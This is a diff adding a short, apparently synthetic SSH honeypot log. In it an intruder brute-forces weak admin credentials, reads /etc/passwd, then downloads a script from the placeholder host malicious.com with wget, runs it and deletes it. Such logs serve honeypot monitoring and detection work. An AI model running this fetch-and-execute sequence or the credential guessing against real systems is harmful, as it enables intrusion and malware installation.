@@ -1,0 +1,9 @@
+2024-01-15 11:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/admin] failed
+2024-01-15 11:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/123456] succeeded
+2024-01-15 11:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: uname -a
+2024-01-15 11:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: cat /etc/passwd
+2024-01-15 11:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: wget http://malicious.com/payload.sh
+2024-01-15 11:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: chmod +x payload.sh
+2024-01-15 11:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: ./payload.sh
+2024-01-15 11:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: rm payload.sh
+2024-01-15 11:00:40+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] connection lost
